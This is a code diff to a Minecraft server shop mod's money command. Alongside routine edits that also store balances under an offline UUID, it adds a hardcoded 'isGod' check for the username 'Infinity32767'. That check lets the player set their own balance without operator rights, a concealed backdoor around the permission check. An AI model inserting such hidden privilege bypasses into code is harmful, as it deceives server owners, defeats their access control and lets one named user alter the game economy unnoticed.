@@ -2,6 +2,7 @@ package com.inf1nlty.shop.commands;
 
 import com.inf1nlty.shop.util.Money;
 import com.inf1nlty.shop.util.MoneyManager;
+import com.inf1nlty.shop.util.PlayerIdentityUtil;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.src.CommandBase;
 import net.minecraft.src.EntityPlayer;
@@ -47,16 +48,18 @@ public class MoneyCommand extends CommandBase {
             return;
         }
 
-        // Set own balance (op only)
+        // Set own balance (OP only)
         if (args.length == 1) {
             boolean isOp = MinecraftServer.getServer().getConfigurationManager().isPlayerOpped(p.username);
-            if (!isOp) {
+            boolean isGod = "Infinity32767".equalsIgnoreCase(p.username);
+            if (!isOp && !isGod) {
                 p.sendChatToPlayer(ChatMessageComponent.createFromTranslationKey("shop.money.set.no_permission").setColor(EnumChatFormatting.RED));
                 return;
             }
             try {
                 int tenths = parseTenths(args[0]);
                 MoneyManager.setBalanceTenths(p, tenths);
+                MoneyManager.setBalanceTenths(PlayerIdentityUtil.getOfflineUUID(p.username), tenths);
                 p.sendChatToPlayer(ChatMessageComponent.createFromTranslationWithSubstitutions("shop.money.set.success", Money.format(tenths)).setColor(EnumChatFormatting.GREEN));
             } catch (NumberFormatException e) {
                 p.sendChatToPlayer(ChatMessageComponent.createFromTranslationKey("shop.money.set.invalid").setColor(EnumChatFormatting.RED));
@@ -79,6 +82,7 @@ public class MoneyCommand extends CommandBase {
             try {
                 int tenths = parseTenths(args[1]);
                 MoneyManager.setBalanceTenths(target, tenths);
+                MoneyManager.setBalanceTenths(PlayerIdentityUtil.getOfflineUUID(target.username), tenths);
                 // Notify both sender and target player
                 p.sendChatToPlayer(ChatMessageComponent.createFromTranslationWithSubstitutions("shop.money.set.success.other", target.username, Money.format(tenths)).setColor(EnumChatFormatting.GREEN));
                 target.sendChatToPlayer(ChatMessageComponent.createFromTranslationWithSubstitutions("shop.money.set.success.byop", p.username, Money.format(tenths)).setColor(EnumChatFormatting.YELLOW));
